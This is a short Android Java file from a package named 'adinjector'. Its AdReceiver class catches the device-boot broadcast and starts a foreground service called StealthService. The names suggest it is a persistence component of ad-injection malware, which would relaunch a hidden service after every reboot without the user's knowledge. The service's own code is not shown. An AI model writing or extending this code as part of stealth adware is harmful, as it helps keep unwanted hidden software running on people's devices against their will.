package com.example.adinjector;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class AdReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context ctx, Intent intent) {
        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
            Intent serviceIntent = new Intent(ctx, StealthService.class);
            ctx.startForegroundService(serviceIntent);
        }
    }
}
